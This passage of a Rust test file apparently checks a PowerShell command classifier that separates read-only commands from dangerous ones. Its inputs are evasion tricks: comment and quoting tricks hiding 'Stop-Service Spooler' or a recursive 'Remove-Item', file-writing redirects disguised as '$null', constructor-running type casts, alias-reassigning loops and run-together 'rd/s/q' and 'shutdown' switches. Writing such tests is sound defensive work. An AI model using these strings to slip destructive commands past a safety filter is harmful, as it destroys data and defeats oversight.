        "& {\nWrite-Output \"a\"#'\nStop-Service Spooler\n#'\n}",
        "& {\nWrite-Output [int]#'\nStop-Service Spooler\n#'\n}",
        "& {\nWrite-Output {}#'\nStop-Service Spooler\n#'\n}",
        "& {\nWrite-Output @{}#'\nStop-Service Spooler\n#'\n}",
        "& {\nWrite-Output $x[0]#'\nStop-Service Spooler\n#'\n}",
        "& {\nWrite-Output a,b#'\nStop-Service Spooler\n#'\n}",
        "& {\nGet-Date -a:#'\nStop-Service Spooler\n#'\n}",
        "& {\nWrite-Output 'a'<#'\nStop-Service Spooler\n#'#>\n}",
        "if ($true) {\nWrite-Output 'a'#'\nStop-Service Spooler\n#'\n}",
    ] {
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // A hidden dangerous command is still caught by the rules on the raw text.
    assert!(flagged(
        "if ($true) {\nGet-Date | Where-Object {}#'\nRemove-Item C:\\data -Recurse -Force\n#'\n}",
        "Remove-Item -Recurse / rd /s"
    ));
    // A comment after whitespace or a boundary still reads.
    assert!(read_only("Get-Date # today's date"));
    assert!(read_only("(Get-Date) # a comment"));
}

#[test]
fn p2_a_redirect_target_glued_to_null_writes_a_file() {
    for trick in [
        "Get-Process >$null'C:\\inetpub\\wwwroot\\web.config'",
        "Get-Date >$null\\Windows\\Temp\\x.txt",
        "Get-Date 2>$null\\x.txt",
        "Get-Date >$null-x",
        "Get-Date >${null}x",
    ] {
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // A clean `$null` redirect still reads.
    assert!(read_only("Get-Date >$null"));
    assert!(read_only("Get-Date 2>$null; Get-Service"));
}

#[test]
fn p3_a_type_literal_that_may_run_a_constructor_is_not_read_only() {
    for trick in [
        "[IO.StreamWriter] -join 'C:\\data\\f.txt'",
        "[IO.StreamWriter]-join 'C:\\data\\f.txt'",
        "'C:\\data\\f.txt' -as [string][IO.StreamWriter]",
        "'C:\\data\\f.txt' -as [string]'IO.StreamWriter'",
        "'C:\\data\\f.txt' -as [int] -as [IO.StreamWriter]",
        "'C:\\data\\f.txt' -as 'IO.StreamWriter'",
    ] {
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // A value-type `-as` or a `-is` type test still reads.
    assert!(read_only("'5' -as [int]"));
    assert!(read_only("$x -is [IO.StreamWriter]"));
}

#[test]
fn p4_a_foreach_variable_that_assigns_is_not_read_only() {
    for trick in [
        "foreach ($alias:hostname in 'Stop-Service') { hostname Spooler }",
        "foreach ($function:hostname in 'Stop-Service Spooler') { hostname }",
        "foreach ($env:PSModulePath in 'C:\\x') { }",
        "foreach ($PSDefaultParameterValues in @{ '*:MemberName' = 'Kill' }) { }",
    ] {
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // A plain loop variable still reads.
    assert!(read_only("foreach ($s in Get-Service) { $s.Name }"));
}

#[test]
fn p5_invoker_cmdlets_with_a_variable_block_write() {
    for trick in [
        "Get-Service | Where-Object -FilterScript:$sb",
        "Get-Service | Sort-Object -Property:$sb",
        "Measure-Command -Expression:$sb",
        "Compare-Object $a $b -Property $sb",
        "Get-Service | ConvertTo-Html -Property $sb",
        // A bare Where-Object runs whatever $PSDefaultParameterValues sets for its filter.
        "Get-Date | Where-Object",
    ] {
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // A literal filter or property names still read.
    assert!(read_only("Get-Service | Where-Object { $_.Status -eq 'Running' }"));
    assert!(read_only("Get-Service | Sort-Object Status, Name"));
}

#[test]
fn p6_run_together_cmd_switches_are_flagged() {
    assert!(flagged("cmd /c rd/s/q C:\\data", "Remove-Item -Recurse / rd /s"));
    assert!(flagged("cmd /c \"rd/s/q C:\\data\"", "Remove-Item -Recurse / rd /s"));
    assert!(flagged("cmd /c shutdown/r/t 0", "shutdown / logoff"));
}

#[test]
fn p7_only_long_decimal_and_size_suffixes_are_numbers() {
    // Windows PowerShell 5.1 runs `1s`, `1u`, `1y`, `1n` as commands (programs on PATH).
    for command in [
        "1s Get-Date",
        "1u Get-Date",
        "1y Get-Date",
        "1n Get-Date",
        "1us Get-Date",
    ] {
        let token = command.split(' ').next().unwrap();
        assert_eq!(names(command).first().map(String::as_str), Some(token), "{command}");
    }
    // `l`, `d` and the size multipliers are numbers.
    assert!(read_only("1l + 1d"));
    assert!(read_only("1kb"));
}
